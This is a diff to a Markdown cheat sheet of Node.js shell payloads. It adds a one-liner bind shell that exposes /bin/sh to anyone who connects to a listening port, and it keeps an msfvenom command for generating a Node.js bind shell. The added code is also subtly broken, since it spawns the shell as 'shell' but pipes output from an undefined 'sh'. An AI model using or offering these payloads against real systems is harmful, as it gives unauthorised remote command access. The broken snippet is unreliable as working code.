@@ -1,7 +1,23 @@
 # NodeJS
 
-## 01 - Generate via `msfvenom`
+## 01 - One-liners
+
+```javascript
+node -e 'shell = require("child_process").spawn("/bin/sh");
+require("net").createServer(function (client) {
+  client.pipe(shell.stdin);
+  sh.stdout.pipe(client);
+  sh.stderr.pipe(client);
+}).listen(process.env.<PORT>)'
+```
+
+## 02 - Generate via `msfvenom`
 
 ```
 $ msfvenom -p cmd/unix/bind_nodejs lport=<PORT>
 ```
+
+---
+## References
+
+- [GTFOBins: NodeJS]
